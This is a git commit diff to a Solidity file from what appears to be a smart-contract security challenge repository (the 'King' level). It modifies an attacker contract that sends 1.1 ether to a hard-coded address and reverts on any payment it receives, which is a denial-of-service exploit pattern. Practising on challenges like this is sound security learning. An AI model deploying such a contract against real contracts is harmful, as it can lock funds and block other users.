e777e7e8f098e2a769f71648b6ca0769fadb3367
zhou <1036767219@qq.com>
2023-01-14 19:54:18 +0800

    update King合约，upload Re-entrancy合约

--- 10_King.sol
+++ 10_King.sol
@@ -2,7 +2,7 @@ pragma solidity ^0.6.12;
 
 contract att1{
     function a() public payable{
-        0x5aD9675495Cce5D9D0d1245Ef738CAdC45828E46.call{value : msg.value}("");
+        0x5aD9675495Cce5D9D0d1245Ef738CAdC45828E46.call{value : 1.1 ether}("");
     }
     receive() external payable{
         revert();
